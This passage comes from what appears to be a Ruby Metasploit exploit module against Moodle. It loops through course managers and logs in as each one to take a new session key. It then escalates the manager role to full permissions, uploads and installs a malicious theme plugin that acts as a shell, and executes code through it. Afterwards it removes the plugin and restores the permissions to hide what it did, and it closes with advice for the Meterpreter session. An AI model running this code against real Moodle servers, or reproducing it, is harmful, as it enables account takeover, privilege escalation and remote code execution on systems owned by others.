    # loop through all maangers looking for a 'login as' link
    success = false
    managers.each do |manager|
      next if manager == userid

      print_status("Attempting loginas for user id: #{manager}")
      res = moodle_loginas(courseid, manager, sesskey)
      res.body =~ %r{You are logged in as [^>]+>([^<]+)</span>}
      print_status("Logged in as: #{Regexp.last_match(1)}")
      if res.body.include?('Site administration')
        print_good('Looks like a potentially good manager account!')
      end
      res.body =~ /"sesskey":"(.*?)"/
      new_sesskey = Regexp.last_match(1)
      print_status("Attempting via new session key: #{new_sesskey}")
      set_manager_permissions(manager_all_permissions(new_sesskey))
      print_status('Checking if permissions were set successfully')
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'admin', 'search.php')
      })
      fail_with(Failure::Unreachable, 'Error retrieving settings') unless res
      next unless res.body.include?('Install plugins')

      print_good('Manager roll full permissioned, attempting to upload shell')
      success = true
      addon_content, header, addon_name = create_addon_file
      print_status('Uploading addon')
      file_id, addon_sesskey = upload_addon(addon_name, version, addon_content)
      fail_with(Failure::NoAccess, 'Unable to upload addon.  Make sure you are able to upload plugins with current permissions') if file_id.nil?
      print_good('Upload Successful.  Integrating addon')
      ret = plugin_integration(addon_sesskey, file_id, addon_name)
      if ret.nil?
        fail_with(Failure::NoAccess, 'Install not successful')
      end
      exec_code(addon_name, header)
      print_status('Uninstalling plugin')
      remove_plugin("theme_#{addon_name}", version, addon_sesskey)
      print_status('Resetting permissions')
      set_manager_permissions(manager_default_permissions(sesskey))
      break
    end
    print_bad('Failed to upgrade permissions on manager roll') unless success
  end

  def on_new_session(_)
    print_good('You will need to change directories on meterpreter to get full functionality. Try: cd /tmp')
  end
end
